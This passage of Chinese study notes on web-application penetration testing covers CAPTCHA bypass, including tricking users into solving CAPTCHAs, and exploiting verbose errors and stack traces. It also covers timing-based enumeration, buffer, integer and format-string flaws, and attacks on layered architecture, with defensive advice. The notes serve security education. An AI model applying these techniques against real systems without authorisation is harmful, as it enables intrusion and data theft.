<li>是否将库中的 cookie 添加到请求中；</li>
<li>是否将响应中的 cookie 添加到库中；</li>
<li>请求参数是否使用预设值，还是使用在响应中获取的值（当存在反 CSRF 令牌时，该方法很有用）；</li>
</ul>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210330080657.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="会话处理规则"><a href="#会话处理规则" class="headerlink" title="会话处理规则"></a>会话处理规则</h4><p>原理很简单，即通过对特定请求进行预处理，以避开应用程序的会话限制；由于应用程序可能在不同的功能中使用不同的限制规则，因此需要有针对性的配置规则；当 Burp 发起某个请求时，如果满足预设的匹配条件，就会触发预处理；</p>
<p>匹配规则有：发起请求的 Burp 工具、请求的 URL、请求中的参数名称；</p>
<p>预处理操作包括：添加 cookie ，设置特定的 cookie 或参数值、检查当前会话是否有效并根据结果执行不同的操作、运行宏、提示会话恢复；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210330081223.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210330081301.png" srcset="/img/loading.gif" lazyload></p>
<p>配置规则时，有时候避免会出错，导致 Burp 并不按预期的方式进行工作，因此Burp 还提供一项会话处理追踪的功能，用来监控和调试会话处理规则，以便确保配置是否按预期的方式进行；</p>
<h3 id="CAPTCHA-控件"><a href="#CAPTCHA-控件" class="headerlink" title="CAPTCHA 控件"></a>CAPTCHA 控件</h3><p>随着计算机识别图片内容能力的不断强化，事实上现在人类与计算机的水平已经相当，导致 CAPTCHA 已经失去了它在一开始预算起到的作用；</p>
<h4 id="攻击-CAPTCHA-控件"><a href="#攻击-CAPTCHA-控件" class="headerlink" title="攻击 CAPTCHA 控件"></a>攻击 CAPTCHA 控件</h4><p>搞笑的是，有很多应用程序在发送 CAPTCHA 拼图时，还会悄悄的把答案也发过来，一般有以下几种方式：</p>
<ul>
<li>拼图的图像通过 URL 加载，拼图的答案就在 URL 的参数或者图片名称中；</li>
<li>拼图的答案放在某个隐藏表单的字段中；</li>
<li>拼图答案出现在 HTML 注释或其他位置（用于调试）；</li>
</ul>
<p>正常情况下，拼图应该只使用一次后就废弃，但有些应用程序并不是这么做的，而是反复使用；因此，攻击者可以先手工解决某张拼图的答案，然后在请求在反复提交拼图和相应的答案；</p>
<h4 id="自动破解-CAPTCHA-拼图"><a href="#自动破解-CAPTCHA-拼图" class="headerlink" title="自动破解 CAPTCHA 拼图"></a>自动破解 CAPTCHA 拼图</h4><p>目前绝大多数拼图算法都可以被计算机轻松破解，破解的过程如下：</p>
<ul>
<li>删除图像中的噪声；</li>
<li>把图片分割单个字母；</li>
<li>识别每个部分中的字母；</li>
</ul>
<p>目前网上已经有一些非常成熟的库，可以用来处理 CAPTCHA 拼图；针对不同的拼图类型，可以使用不同的库进行处理；事实上，拼图识别效率并不需要 100%，即使只能识别 10%，那么也能够让 10% 的请求变成有效的，而提出大量的请求对计算机来说是最简单不过的任务了；</p>
<h4 id="人类破解者"><a href="#人类破解者" class="headerlink" title="人类破解者"></a>人类破解者</h4><ul>
<li>有一些第三方的付费服务可以调用，让其破解拼图，每破解 1000 个拼图的费用不到 1 美元；</li>
<li>另外攻击者还可以自建一个外表看起来正常的善意的网站，然后实际传输的是目标网站的拼图，并诱使其用户对拼图进行破解；攻击者还经常在其网站上使用竞赛奖励或者免费访问色情内容的方式来吸引用户帮助其破解；</li>
</ul>
<h2 id="小结-9"><a href="#小结-9" class="headerlink" title="小结"></a>小结</h2><p> 思维方式的不同是真正的 Web 应用程序黑客和普通爱好者之间的最大区别，因为任何工具都替代不了人类的智慧；</p>
<h1 id="15-利用信息泄露"><a href="#15-利用信息泄露" class="headerlink" title="15. 利用信息泄露"></a>15. 利用信息泄露</h1><h2 id="利用错误消息"><a href="#利用错误消息" class="headerlink" title="利用错误消息"></a>利用错误消息</h2><h3 id="错误消息脚本"><a href="#错误消息脚本" class="headerlink" title="错误消息脚本"></a>错误消息脚本</h3><p>对于解释型语言来说，其代码实际上是运行在解释器中的，为了方便调试，当发生错误时，大多数解释器都会输出详细的错误信息，以及函数的调用栈等。这意味着如果 Web 应用程序是使用脚本语言来编写的话，如果控制不当，攻击者就有可能获取这些信息，从而为攻击提供便利；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210331090602.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>类型不匹配错误：缩小了攻击参数的范围</p>
<p>行号可用来判断每次触发的是否是同一个位置的错误，以及应用程序在处理多个参数时的顺序；</p>
</blockquote>
<h3 id="栈追踪"><a href="#栈追踪" class="headerlink" title="栈追踪"></a>栈追踪</h3><p>当某种由高级语言编写的程序，是运行在某个托管环境中的时候（即解释器，如 Java、C#、Python、JS 等），如果出现了无法处理的错误，那么解释器将会抛出错误，此时浏览器往往会显示完整的栈追踪；栈追踪显示的信息将给攻击带来极大的帮助，主要包括：</p>
<ul>
<li>可通过栈信息详细了解错误发生的原因，从而可以调整输入，避开错误；</li>
<li>如果程序调用第三方的库，则也会同时显示在栈追踪中，此时可以查阅这些第三方库的源代码，了解它们的行为和逻辑，并下载它们在本地进行测试，探查应用程序处理异常输入的逻辑，发现潜在的漏洞；</li>
<li>调用栈中很可能还会显示一些组件调用的情况，通过组件的命名，可以推测应用程序的内部结构和功能；</li>
<li>栈追踪中显示的行号可用来探查应用程序的逻辑；</li>
<li>栈追踪中通常还包括运行环境的信息，例如框架的名称和版本，从而可以根据该信息，搜索查找其已知的漏洞、异常行为和常见的配置错误等；</li>
</ul>
<h3 id="详尽的调试信息"><a href="#详尽的调试信息" class="headerlink" title="详尽的调试信息"></a>详尽的调试信息</h3><p>在开发阶段，开发者通常会让程序输出大量的调试，从而有助于开发者对应用程序进行调试，这些调试信息通常会揭露应用程序当行的运行状态，常见信息包括：</p>
<ul>
<li>保存在会话中的变量值；</li>
<li>数据库等后端组件的主机名称和密码等敏感信息；</li>
<li>服务器中的文件和目录名称；</li>
<li>保存在会话令牌中的令牌；</li>
<li>数据传输的加密密钥；</li>
<li>CPU 寄存器的值、栈内容、加载的 DLL 列表和路径等；</li>
</ul>
<h3 id="服务器与数据库消息"><a href="#服务器与数据库消息" class="headerlink" title="服务器与数据库消息"></a>服务器与数据库消息</h3><p>除了应用程序本身，其他组件如数据库、邮件服务器、SOAP 服务器等，在遇到无法处理的错误时，也会抛出详细的错误信息；有时候这些信息会被应用程序放在响应主体中返回到前端，此时攻击者可以利用这些信息，探查到更多的漏洞，常见的利用形式包括：</p>
<ul>
<li>扩大攻击范围：例如数据库抛出查询错误，从而暴露了 SQL 查找代码的逻辑，攻击者可加以利用，优化 SQL 注入行为；</li>
<li>实施跨站点脚本攻击：有些框架返回错误消息的响应时，没有对错误消息进行 HTML 编码，因此如果错误消息中的某个部分是可以由用户控制的输入，那么此时攻击者就有机会针对性的设计输入，干扰浏览器的解析，实现跨站点脚本注入攻击；</li>
<li>获取解密提示：应用程序可能使用某个解密值对某个加密文件进行解密，但该文档不存在时，该解密值有可能会意外显示在错误消息中；</li>
<li>获取重要的文件路径：错误消息可能会暴露应用程序加载某个服务器文件路径中的文件，此时攻击者可以找机会上传文件，覆盖该路径中的文件；</li>
</ul>
<p>渗透测试步骤</p>
<ul>
<li>当通过设计攻击字符串发送大量攻击请求时，应始终监控应用程序的响应，在确定是否包含有用的错误信息；发挥想象力，强制应用程序返回错误响应，例如对未处于就绪状态的资源，发起请求；</li>
<li>应用程序返回的响应内容不一定会显示在浏览器中，应留意所有可能出现错误信息的关键字，例如：error, exception, illegal, invalid, fail, stack, access, directory, file, not found, varchar, ODBC, SQL, SELECT 等；</li>
<li>另外需要留意一下出现在响应中的关键字，是否原本就已经在发送的请求参数中了，如果是的话，则不一定是错误响应，应当排除；</li>
<li>可以使用 Grep 函数来搜索匹配的关键字；如果发现，应当手动检查相应的响应，分析其中是否包含有用的信息；</li>
</ul>
<blockquote>
<p>有些浏览器会隐藏原始的错误消息，然后用一个浏览器自己的定制页面来替代，因此需要提前关闭浏览器的该项功能；</p>
</blockquote>
<h3 id="借助搜索引擎"><a href="#借助搜索引擎" class="headerlink" title="借助搜索引擎"></a>借助搜索引擎</h3><p>不同的 Web 应用程序使用的库不尽相同，经常五花八门，当出现一些未曾见过的错误信息时，只需到网上进行搜索，即可以进一步了解到该错误发生的原因和逻辑；</p>
<blockquote>
<p>开发者有时并不一定直接引用某个库，而只是复制部分代码，合并到其源代码中；</p>
</blockquote>
<p>渗透测试步骤</p>
<ul>
<li>使用标准搜索引擎搜索任何不常见的错误消息文本，以及学会使用各种高级搜索特性，缩小搜索的范围，例如："unable to retrieve" filetype:php</li>
<li>同一条错误消息，其他应用程序生成的内容可能更加详细，有助于更好的了解错误发生的条件；</li>
<li>使用 Google 代码搜索功能，查找生成特定错误消息的开源代码；学会使用高级搜索特性指定代码语言和一些已知的细节，从而缩小搜索范围，提高搜索效率，例如 "unable to retrieve lang:php package:mail"</li>
<li>如果从栈追踪中得知了所使用的第三方库或组件的名称，则可以直接搜索这些名称；</li>
</ul>
<h3 id="制造详尽的错误消息"><a href="#制造详尽的错误消息" class="headerlink" title="制造详尽的错误消息"></a>制造详尽的错误消息</h3><p>攻击者通过系统性的制造错误条件，触发错误消息，很可能可以从错误消息中收获很多有价值的敏感信息。例如让应用程序对某个数据执行某种无效的操作（如字符串转整数），就会自动触发错误条件，导致应用程序报错；如果报错的信息中，会暴露该无效操作要处理的数据，则攻击者就得到了该数据，而且正常情况下，攻击者是不知道该数据的值的；</p>
<blockquote>
<p>例如可以在 SQL 注入攻击中，在 SQL 语句中检索某个数据并对其进行错误的类型转换，从而触发 ODBC 的报错，然后从报错消息中得到检索的数据</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210410092712.png" srcset="/img/loading.gif" lazyload></p>
</blockquote>
<p>如果应用程序在报错时，会生成包含错误描述的栈追踪，则可以利用该特性，将想要获取的有用信息，合并到错误描述中；</p>
<p>有些数据库允许开发者创建自定义函数，假设应用程序存在 SQL 注入漏洞，那么攻击者就可以利用该漏洞，注入任意的自定义函数，执行任意的动作。假设应用程序还会返回错误信息给浏览器，那么攻击者就可以故意让函数生成异常，并将获取的信息，放在错误消息中，让应用程序返回。</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210410093438.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="收集公布的信息"><a href="#收集公布的信息" class="headerlink" title="收集公布的信息"></a>收集公布的信息</h2><p>由于功能设计需要，应用程序会在界面上有意无意的显示出来一些对攻击者有用的敏感信息，例如：</p>
<ul>
<li>有效用户名、ID、文档列表等；</li>
<li>用户个人资料、用户角色、权限、最后登录日期、账户状态等；</li>
<li>用户当前使用的密码（一般不会直接显示在页面上，但却出现在响应的源代码中）；</li>
<li>部分日志文件中的信息，如用户名、URL、执行的动作、会话令牌、数据库查询等；</li>
<li>HTML 源代码中的注释内容，如链接、表单字段等；</li>
</ul>
<p>渗透测试步骤：</p>
<ul>
<li>核对应用程序的解析结果，看哪些服务端功能，或者哪部分客户端数据，可用于获取有用的信息；</li>
<li>找出服务端会返回敏感信息的所有位置（注意：这些敏感信息可能只出现在响应内容中，但没有在界面上显示）；</li>
<li>检查应用程序是否存在访问控制或会话控制的漏洞，如果有，则可以用来获取其他用户的敏感数据；</li>
</ul>
<h2 id="使用推论"><a href="#使用推论" class="headerlink" title="使用推论"></a>使用推论</h2><p>有时候，应用程序可能并不会泄露数据，但由于其功能设计缺陷，导致攻击者可以通过逆向推理，获知有用的信息，例如：</p>
<ul>
<li>如果用户名已经存在，注册功能会给出提示，因此攻击者可以利用这个提示对用户进行枚举；</li>
<li>搜索引擎将所有内容编入索引，在搜索功能中未做权限检查或过滤；</li>
<li>利用 SQL 注入漏洞，一个查询一个字符，虽然查询的内容并不会返回，但是可以将查询结果放入表达式进行计算，若条件成立，则设置其会触发错误，通过是否得到错误响应，来反向推断查询结果是否符合表达式的计算预期；</li>
</ul>
<p>另外，攻击者还可以通过响应的时间延迟，来推断某些数据是否有效；</p>
<ul>
<li>许多大型系统由于其数据库的条目较为庞大，单次查询需要花费较多的时间，为了提高性能，一般会使用缓存机制，即将频繁使用放在缓存中；因此，通过访问时间的差别，攻击者可以推断哪些数据最近有被访问；</li>
<li>有些请求需要验证用户的身份信息，因为应用程序需要查询数据库，进行权限的逻辑判断，攻击者可以利用处理时间的差异，枚举出有效的用户名；</li>
<li>当用户在请求中提交一个无效的参数时，有可能造成应用程序的处理超时；根据是否超时，攻击者可以枚举有效的参数值，了解参数值的范围，例如该参数值是服务端内部网络的地址，那么攻击者就可以枚举出有效的主机地址（Burp 工具内置一个响应计时器，可以用来判断这种情况是否出现）；</li>
</ul>
<p>渗透测试步骤：</p>
<ul>
<li>总体来说，应用程序在处理大多数请求时，其响应时间的差异非常小，如果有，也很难排除是否是由于随机的网络状况引起的，需要定量统计才能排除；只有少数功能涉及 IO 或 CPU 的密集计算，才会导致存在差异；</li>
<li>为测试某个功能在处理有效和无效数据时，是否存在时间差异，可以准备两个待发送的数据列表，一个全是有效的数据，一个全是无效的，然后不断发送请求，一次只发一个，最后比对二者在响应时间上是否存在统计差异（Burp 有内置自动统计的工具）；</li>
</ul>
<h2 id="防止信息泄露-1"><a href="#防止信息泄露-1" class="headerlink" title="防止信息泄露"></a>防止信息泄露</h2><h3 id="使用常规错误消息"><a href="#使用常规错误消息" class="headerlink" title="使用常规错误消息"></a>使用常规错误消息</h3><p>应避免向浏览器返回任何服务端的错误消息或调试消息，而是只返回一种统一的消息格式，同时将服务端的错误或调试消息单独记录在日志文件中；如果需要用户汇报错误情况，则可以给浏览器返回一个日志索引号，当用户反馈错误时，只需要提交该索引号即可；</p>
<p>多数 Web 应用程序框架或者服务器软件都支持拦截错误消息的配置，配置后，错误消息将不会返回给浏览器，而是返回一个统一定制的错误页面；</p>
<h3 id="保护敏感信息"><a href="#保护敏感信息" class="headerlink" title="保护敏感信息"></a>保护敏感信息</h3><p>应用程序应禁止向浏览器发送任何有关用户的敏感信息，如用户名、用户个人资料、日志记录等；如果用户需要查看这些信息，则应对查看功能加上权限检查，同时，只返回信息的截短后的形式，而不是完全披露现有的数据；</p>
<h3 id="尽量减少客户端信息泄露"><a href="#尽量减少客户端信息泄露" class="headerlink" title="尽量减少客户端信息泄露"></a>尽量减少客户端信息泄露</h3><p>只要有可能，应该删除或者修改任何有关服务器软件、软件框架名称和版本等相关信息的标记，避免泄露特定的版本信息；同时，应该删除生产环境中的代码的所有注释；</p>
<p>此外，如果在前端使用一些第三方组件，如 Java Applet 或者 ActiveX 控件，则也应该避免在其中存放任何的敏感信息，因为攻击者可以逆向它们；</p>
<h1 id="16-攻击本地编译型应用程序"><a href="#16-攻击本地编译型应用程序" class="headerlink" title="16. 攻击本地编译型应用程序"></a>16. 攻击本地编译型应用程序</h1><p>现在多数 Web 应用程序都不再是本地编译型程序了，它们大多数都运行在某个解释环境中，例如 Java，C#，Python，NodeJS 等；尽管如此，它们仍然有可能调用某些编译型语言写的库，因此，除非有充分的信息说明该应用程序未调用任何本地编译的代码，否则应该对其进行漏洞探查；</p>
<p>本地编译型程序的代码是由 CPU 直接运行的，没有解释环境，因此，它们一般受到缓冲区溢出、格式化字符串、整数漏洞等问题的困扰，当对这些漏洞进行探查时，很容易造成整个应用程序的崩溃（如果是对现有处于生产状态的应用程序进行这方面漏洞的探查工作，则需要知悉这个风险，通常情况下，最好是对测试环境中的程序进行探查比较好）；</p>
<blockquote>
<p>本地编译型软件的漏洞是另外一个巨大的课题，如需要进一步研究，作者推荐以下几本参考书：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210412084632.png" srcset="/img/loading.gif" lazyload></p>
</blockquote>
<h2 id="缓冲区溢出漏洞"><a href="#缓冲区溢出漏洞" class="headerlink" title="缓冲区溢出漏洞"></a>缓冲区溢出漏洞</h2><p>由于虚拟内存机制，应用程序的指令实际上能够控制的是虚拟内存，物理内存理论上应该不存在缓冲区溢出的问题。溢出问题主要出现在写入的数据，超过了所分配的空间，因此，多出来的部分，覆盖了其他旧数据。当应用程序尝试读取旧数据时，实际上已经被替换为溢出的新数据，此时如果应用程序没有察觉，就有可能信任这些数据并直接使用或者执行。</p>
<h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p>开发者常常犯的一个错误是将某个大小可变的数据，写入某个大小固定的内存中；在开发的时候，开发者会默认正常的输入有最大长度，但如果没有校验和过滤，实际上输入的长度将是任意的；</p>
<p>默认情况下，如果没有特别声明，函数内部的局部变量使用栈来存储临时的数据，因此，攻击者可以通过控制实参的长度，让其超过开发者在函数中分配的变量长度，造成栈溢出；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210413072251.png" srcset="/img/loading.gif" lazyload></p>
<p>栈空间是由编译管理和分配的，因此其中保存着函数调用后的返回地址；当发生栈溢出后，原本的返回地址将被改写；但CPU 并不知晓，但其尝试读取返回地址时，实际上很可能会取到攻击写入的其他返回地址，跳转到攻击者注入的代码，执行攻击者预设的指令；</p>
<h3 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h3><p>堆溢出和栈溢出并没有本质上的区别，唯一的差别是发生的地点在堆上；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210413072426.png" srcset="/img/loading.gif" lazyload></p>
<p>堆是由开发者进行管理和分配的，因此里面通常保存着纯数据类型的内容，不像栈中放着返回地址；当发生堆溢出时，会覆盖其他块的头部数据，导致其他块不可用。由于堆通常使用双向链接结构来实现，因此一旦某个块被破坏了，后续的块可能全部不可用了；</p>
<p>因此，如果要利用堆溢出的漏洞，攻击者就必须特别小心，需要精心设计其溢出数据，让其在不破坏原本下一个块的头部数据的基础上，改写其中的指向下一个链表指针。该值被修改后，并不会马上发生什么后果；但是当这个块被回收时，由于堆控制器需要更新链表，因此它需要从块的头部数据中，读取下一个块的址，但实际上，该地址的值已经被攻击者通过溢出修改了。攻击者可以让这个地址的值，指向任意位置，执行其注入的指令；一般攻击者会让改写后的指针值，指向下一个被调用的函数地址，这样该函数就会在接下来执行；或者指向异常处理函数的地址，这样当下次发生异常时，函数会被执行；</p>
<blockquote>
<p> 由于开发者的编程错误不可避免，因此目前很多编译器和操作系统已经设计出了各种机制，来尽量缓冲区溢出的问题；整体来说，缓冲区溢出漏洞的利用比以往要难得多；</p>
</blockquote>
<h3 id="一位偏移漏洞"><a href="#一位偏移漏洞" class="headerlink" title="一位偏移漏洞"></a>一位偏移漏洞</h3><p> 理论上，为了避免出现缓冲区溢出，开发者在复制参数内容，写入分配的缓冲区时，应该控制写入的长度，示例如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210413075720.png" srcset="/img/loading.gif" lazyload></p>
<p>在代码中，开发者已经将长度控制在 32 位了，但是，由于字符串最后还需要一个终止符，所以实际字符串的最大长度只能是 31 位；此时，如果攻击者传入 32 位的字符串参数，将导致终止符溢出，覆盖邻近内存上的数据；</p>
<p>通常字符串的终止符只有一个字节的长度，而邻近的内存，正常是另外一个栈桢的头部，该头部通常包含着返回地址；当溢出发生时，原本的返回地址将有一个低位字节被改写为零（地址通常不止一个字符，例如 32 位的字符有4个字节）；被改写后的返回地址的值变小了，因此很可能会重新指向原本的 _username 缓冲区中，从而指向攻击者控制的数据；如果攻击者精心设计其输入的数据，那么便有可能接管接下来要执行的指令；</p>
<p>另外还有一种漏洞，是开发者忘了给缓冲区中的字符串添加终止符， 这样会导致编译器无法在预期的位置结束字符串，而是会一直往下读取，直到遇到值为零的字符为止；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210413080927.png" srcset="/img/loading.gif" lazyload></p>
<p>这种漏洞会造成应用程序一些奇怪的异常行为，它使用变量值变长了，如果该变量值有可能被返回到浏览器的话，那么攻击者就可以利用这个漏洞来获取内存中的其他数据，造成信息泄露的风险；</p>
<h3 id="查找缓冲区溢出漏洞"><a href="#查找缓冲区溢出漏洞" class="headerlink" title="查找缓冲区溢出漏洞"></a>查找缓冲区溢出漏洞</h3><p>大多数情况下，向应用程序发送一个超过其预期长度的字符串，即可以探查出是否存在缓冲区溢出漏洞（少数漏洞需要发送特定的长度，或者特定范围内的长度）；</p>
<p>渗透测试步骤：</p>
<ul>
<li>由于开发者通常喜欢使用 2 的整数倍做为字符串缓冲区长度，例如 32，128，512，4096 等；因此可向每个目标数据，提交一稍大于缓冲区大小的长字符串，例如 1100， 4200， 33000 等；</li>
<li>一次只攻击一个目标数据；</li>
<li>轮流发起攻击，尽量覆盖所有的目标数据；</li>
<li>可以使用第三方工具如 Burp 设置好规则，然后自动生成各种大小的有效攻击数据；</li>
<li>监控应用程序的反应，看看有没有发生什么异常现象；常见的异常包括：<ul>
<li>HTTP 500 状态码或者出现错误消息（跟不符合格式的输入造成的异常不同）；</li>
<li>比常规内容更详细的错误消息（很可能意味着某个组件发生了错误）；</li>
<li>TCP 没有响应或者突然关闭；</li>
<li>整个 Web 应用程序停止响应；</li>
</ul>
</li>
<li>当发生堆溢出时，一般并不会马上导致程序崩溃，但是很有可能会在后续某个时间点造成崩溃；因此，要确定哪些字符串造成崩溃，还需要一定的观察时间；</li>
<li>一位偏移漏洞一般不会造成崩溃，但一般会导致出现异常行为，此时应用程序可能会返回异常的数据内容；</li>
</ul>
<p>通常情况下，应用程序会对输入的参数长度进行检查，并告知长度不符合要求，此时可以在其允许的范围内，尽可能的大；另外应用程序的检查机制可能还会限制参数的字符范围，因此，在探查漏洞前，攻击者应该先了解清楚参数规则，然后确保每个参数都符合规则的情况下，长度尽量长（通常可以使用一个已经验证有效的请求中的参数的字符串，然后加大其长度即可）；</p>
<blockquote>
<p>有时候尽管发现了缓冲区溢出漏洞，但是要对其加以利用，仍然要面临很多挑战待解决</p>
</blockquote>
<h2 id="整数漏洞"><a href="#整数漏洞" class="headerlink" title="整数漏洞"></a>整数漏洞</h2><p>计算器以有限的位数，来模拟无限的计算，因此在某些特定的情况下，这种计算存在溢出的风险；</p>
<h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><p>当某个整数的计算结果超过了处理器可处理的最大值或者最小值时，就会发生溢出，这时计算结果会从最大值进入一个极小值，或者反过来，从最小值进入一个极大值；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210414070557.png" srcset="/img/loading.gif" lazyload></p>
<p>上面这段代码计算了参数的长度，并增加 1 个字节，用来存储结束符；但由于长度的类型是 short，每种类型的整数，都有一个能够表示的最大值，对于 short 来说是 65535，因此，当长度计算结果超过了 65535 时，计算并存储结果时，就会发生溢出；攻击者可以利用这个漏洞，让参数长度为 65535，添加 1 后，溢出为 0；malloc 分配了一个长度为 0 的缓冲区，当向缓冲区写入数据时，很可能会覆盖邻近的缓冲区；</p>
<h3 id="符号错误"><a href="#符号错误" class="headerlink" title="符号错误"></a>符号错误</h3><p>在 C 和 C++ 中，有一个讨厌的地方，即整数存在有符号和无符号两种类型，有符号指有正负符号，它需要占用一个位来存储符号；无符号则可以节省一个位，因此可表示的正整数范围更大一些。但是这也引入了一些安全隐患，即开发者在编写代码时，有时候不小心会将两种不同符号类型的变量放在一起计算，这些导致隐式的符号转换，编译器的处理方式是统一转换成无符号类型，这种转换并没有实际性的改变内存中的数据，而只是在逻辑层面，对内存中的数据换类型进行解读，因此原本有符号值，如果按无符号进行解读，有可能从负数变成一个很大的正数；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210414071617.png" srcset="/img/loading.gif" lazyload></p>
<p>攻击者可以利用这个特点，传入一个负数，之后被 strncpy 隐式转换为很大的正数，导致处理器向原本很小的缓冲区尝试写入一个很大长度的字符串，从而发生溢出；</p>
<h3 id="查找整数漏洞"><a href="#查找整数漏洞" class="headerlink" title="查找整数漏洞"></a>查找整数漏洞</h3><p>如果客户端提交的请求中包含整数值，就意味着有可能存在整数溢出的漏洞，常见情况如下：</p>
<ul>
<li>客户端在请求参数、cookie、消息主体中，提交以十进制表示的整数值，此时应特别留意那些表示某个字符串长度的整数值；</li>
<li>有时候表示长度的整数值来源于某个二进制对象，因此并不以十进制表示，而是以十六进制表示，或者使用 Base64 编码，以便于进行 HTTP 传输；</li>
</ul>
<p>渗透测试步骤：</p>
<ul>
<li>当发现存在整数参数值，就可以尝试轮流发送不同的值，这些值分别是有符号和有符号类型的边界值；<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210414072441.png" srcset="/img/loading.gif" lazyload></li>
<li>如果参数以十六进制表示，则将上一步的边界值转换为相应的大端法或小端法的版本，如果十六进制值以 ASCII 格式提交，则应转换成相应的编码字符，确保可以被服务端正确解析</li>
<li>监控提交请求后，应用程序是否出现异常行为</li>
</ul>
<h2 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h2><p> 某些函数接受格式说明符（例如 C 语言中的 printf），有时候这些函数存在被滥用的漏洞。通常这类型的函数接受的变量数量是不定的，并且支持多种类型的参数；其中一个非常危险的格式说明符是 %n，它跟普通的格式说明符的意思很不一样，它表示接受一个指针作为参数，之后会将该说明符之前函数输出的字节数量写入到指针指向的位置；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210414074756.png" srcset="/img/loading.gif" lazyload></p>
<p>这意味着如果攻击者能够控制全部或部分传入的参数，那么就可以修改指针值，让函数调用成功后，将结果写入到其指定的位置，覆盖原来的值，从而导致后续处理器读取的内容发生变化，并跳转到攻击者指定的位置，执行任意的代码；</p>
<h3 id="查找格式化字符串漏洞"><a href="#查找格式化字符串漏洞" class="headerlink" title="查找格式化字符串漏洞"></a>查找格式化字符串漏洞</h3><p>探查格式化字符串漏洞的一个基本办法是在提交的请求参数中，包含大量的格式符，看应用程序如何处理它们；通常来说，如果应用程度存在这方面的漏洞，很有可能导致应用程序崩溃；</p>
<p>渗透测试步骤：</p>
<ul>
<li>轮流向每个目标参数提交包含大量格式化符 %n 和 %s 的字符串；<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210414075345.png" srcset="/img/loading.gif" lazyload></li>
<li>Windows FormatMessage 函数处理 prinft 函数中的说明符的方式略有不同，因此提交的参数应改写如下：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210414075539.png" srcset="/img/loading.gif" lazyload></li>
<li>另外需要将 % 符号使用 URL 编码编成 %25，以便服务端能够正确解析</li>
<li>监控应用程序是否出现异常反应；</li>
</ul>
<h2 id="小结-10"><a href="#小结-10" class="headerlink" title="小结"></a>小结</h2><p>整体来说，即使应用程序存在上述的各种漏洞，因此程序是部署在服务端，攻击者无法像安装在本地端一样对其进行反复的测试探查，因此利用上述漏洞的难度较大。一般攻击比较有可能利用一位偏移的漏洞；</p>
<h1 id="17-攻击应用程序架构"><a href="#17-攻击应用程序架构" class="headerlink" title="17. 攻击应用程序架构"></a>17. 攻击应用程序架构</h1><p>为了提高应用程序的可移植性和健壮性，通常都会对应用程序的各项功能进行模块化，并在模块之间约定好交互方式，这样可以极大的降低代码的耦合性；</p>
<h2 id="分层架构"><a href="#分层架构" class="headerlink" title="分层架构"></a>分层架构</h2><p>最常见的三层架构分别如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210414080644.png" srcset="/img/loading.gif" lazyload></p>
<p>以下是 Java 应用的典型分层</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210414080823.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="攻击分层架构"><a href="#攻击分层架构" class="headerlink" title="攻击分层架构"></a>攻击分层架构</h3><h4 id="利用层之间的信任关系"><a href="#利用层之间的信任关系" class="headerlink" title="利用层之间的信任关系"></a>利用层之间的信任关系</h4><p>假设应用程序中有一层专门负责访问权限检查，另外一层负责数据库查询，通常来说，数据库查询层会默认假设从权限检查层发过来的请求都是已经通过审查的，是有效的，因此会直接执行该层发过来的请求。但是这种假设存在漏洞，即如果攻击者攻陷了权限检查层（例如利用 SQL 注入漏洞），并发出任意请求给数据库查询层，则可以查询任意的数据，而不管是否使用管理员的身份进行查询；</p>
<p>分层架构存在另外一个问题，即层与层之间的信息可能存在隔离，利用数据库查询日志显示攻击者注入的每一条查询；但是日志中可能并没有存储是哪一名用户发起的攻击，需要与业务日志进行交互比对和排查，才有可能定位；</p>
<h4 id="破坏其他层"><a href="#破坏其他层" class="headerlink" title="破坏其他层"></a>破坏其他层</h4><p>如果几个层都在相同的计算机上运行，则攻陷某一层后，攻击者就可以直接破坏其他层实施的安全保护，示例如下：</p>
<h5 id="访问解密算法"><a href="#访问解密算法" class="headerlink" title="访问解密算法"></a>访问解密算法</h5><p>通常情况下，用户的密码不应该在服务端明文保存，而是会进行散列处理，单向加密，确保即使数据库泄露，攻击者也无法提取到密码；但是有些敏感数据只能使用对称加密，因为后续还需要使用它们的明文，例如信用卡号、安全问题等；此时，如果数据库中除了存储加密后的数据，还直接存储密钥的话，那么攻击者一旦攻陷数据层（例如利用 SQL 注入漏洞），则可以直接查询到密钥，从而实现对数据的解密；</p>
<h5 id="利用文件读取提取-MySQL-数据"><a href="#利用文件读取提取-MySQL-数据" class="headerlink" title="利用文件读取提取 MySQL 数据"></a>利用文件读取提取 MySQL 数据</h5><p>假设应用程序存在路径遍历漏洞，那么攻击者可以利用这个漏洞，读取服务器上的数据库文件，绕开数据库和应用程序设置的权限控制机制；</p>
